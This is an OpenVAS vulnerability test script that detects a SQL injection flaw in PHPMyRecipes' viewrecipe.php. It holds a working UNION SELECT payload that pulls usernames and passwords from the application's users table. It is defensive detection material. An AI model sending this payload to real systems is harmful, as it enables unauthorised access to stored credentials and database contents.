###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phpmyrecipes_sql_inj_vuln.nasl 28055 2013-02-22 18:45:39Z feb$
#
# PHPMyRecipes SQL Injection Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903204");
  script_version("$Revision: 11401 $");
  script_bugtraq_id(58094);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-02-22 18:45:39 +0530 (Fri, 22 Feb 2013)");
  script_name("PHPMyRecipes SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/82243");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24537");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation allow the attacker to compromise the
  application, access or modify data in the back-end database.");
  script_tag(name:"affected", value:"PHPMyRecipes version 1.2.2 and prior");
  script_tag(name:"insight", value:"Input passed via 'r_id' parameter in viewrecipe.php is not
  properly sanitised before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with PHPMyRecipes and is prone to SQL
  Injection Vulnerability.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/phpMyRecipes", "/recipes", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir,"/index.php"),  port:port);

  if('>phpMyRecipes' >< res)
  {
    url = string(dir, "/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**",
                "/SELECT/**/CONCAT(username,0x3a,password,0x4f70656e5641532d",
                "53514c2d496e6a656374696f6e2d54657374)GORONTALO,NULL,NULL,",
                "NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users");

    if(http_vuln_check(port:port, url:url, pattern:"OpenVAS-SQL-Injection",
      "-Test", check_header:TRUE, extra_check:"findrecipe.php"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
